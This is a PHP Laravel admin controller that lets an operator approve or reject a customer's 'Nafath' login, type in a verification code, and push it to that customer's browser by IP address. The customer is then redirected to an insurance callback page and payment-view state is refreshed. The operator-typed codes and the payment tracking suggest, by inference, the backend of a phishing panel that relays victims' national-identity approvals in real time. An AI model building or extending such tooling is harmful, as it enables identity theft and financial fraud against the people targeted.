<?php

namespace App\Http\Controllers\Admin;

use App\Events\NafathApproved;
use App\Events\NafathRejected;
use App\Events\NafathCodeUpdated;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\NafathApproveRequest;
use App\Http\Requests\Admin\NafathRejectRequest;
use App\Http\Requests\Admin\NafathUpdateCodeRequest;
use App\Models\CustomerProfile;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;

class AdminNafathController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve Nafath login — sends verification code to the customer's browser
     */
    public function approve(NafathApproveRequest $request): JsonResponse
    {
        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على العميل',
            ], 404);
        }

        // Idempotency — already approved, just re-broadcast
        if ($customer->nafath_verified) {
            $code = $request->input('verification_code') ?? $customer->nafath_verification_code;
            try {
                broadcast(new NafathApproved(
                    $request->customer_ip,
                    $code,
                    '/insurance/nafath/callback'
                ))->toOthers();
            } catch (\Throwable $e) {
                \Log::warning('Broadcast failed (re-broadcast approveNafath): ' . $e->getMessage());
            }
            $this->notifyDashboard($request->customer_ip, 'nafath_approved');
            $this->refreshPaymentViewed($request->customer_ip);
            return response()->json([
                'success' => true,
                'message' => 'تمت إعادة إرسال الموافقة على النفاذ',
            ]);
        }

        $code = $request->input('verification_code');

        $customer->update([
            'nafath_verified'          => true,
            'nafath_verification_code' => $code,
            'current_page'             => '/insurance/nafath/callback',
        ]);

        try {
            broadcast(new NafathApproved(
                $request->customer_ip,
                $code,
                '/insurance/nafath/callback'
            ))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (approveNafath): ' . $e->getMessage());
        }

        $this->notifyDashboard($request->customer_ip, 'nafath_approved');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على النفاذ — تم إرسال رمز التحقق للعميل',
        ]);
    }

    /**
     * Reject Nafath login
     */
    public function reject(NafathRejectRequest $request): JsonResponse
    {
        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على العميل',
            ], 404);
        }

        $customer->update([
            'nafath_verified' => false,
        ]);

        try {
            broadcast(new NafathRejected($request->customer_ip, $request->input('reason')))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (rejectNafath): ' . $e->getMessage());
        }

        $this->notifyDashboard($request->customer_ip, 'nafath_rejected');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض طلب النفاذ',
        ]);
    }

    /**
     * Update Nafath verification code and push to customer via WebSocket
     */
    public function updateCode(NafathUpdateCodeRequest $request): JsonResponse
    {
        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على العميل',
            ], 404);
        }

        $customer->update([
            'nafath_verification_code' => $request->input('verification_code'),
        ]);

        try {
            broadcast(new NafathCodeUpdated(
                $request->customer_ip,
                $request->input('verification_code')
            ))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (updateNafathCode): ' . $e->getMessage());
        }

        $this->notifyDashboard($request->customer_ip, 'nafath_code_updated');

        return response()->json([
            'success' => true,
            'message' => 'تم تحديث رمز التحقق وإرساله للعميل',
        ]);
    }
}
